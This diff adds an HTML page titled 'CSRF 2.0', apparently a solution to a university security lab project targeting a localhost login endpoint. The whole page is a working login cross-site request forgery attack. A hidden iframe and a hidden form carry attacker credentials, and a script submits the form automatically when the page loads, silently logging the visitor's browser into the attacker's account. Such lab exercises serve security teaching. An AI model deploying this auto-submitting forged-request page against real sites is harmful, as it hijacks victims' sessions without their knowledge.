@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<title>CSRF 2.0</title>
+</head>
+
+<body>
+	<!-- The hidden frame keeps the automatic login request invisible. -->
+	<iframe name="login-frame" hidden></iframe>
+
+	<!-- No CSRF token is required by the 2.0 endpoint. -->
+	<form id="login-form"
+		action="http://localhost/project2/login?csrfdefense=0&xssdefense=4"
+		method="POST"
+		target="login-frame"
+		hidden>
+		<input type="hidden" name="username" value="attacker">
+		<input type="hidden" name="password" value="badguy4">
+	</form>
+
+	<script>
+		// Submit the forged login request as soon as the attack page opens.
+		document.getElementById("login-form").submit();
+	</script>
+</body>
+
+</html>
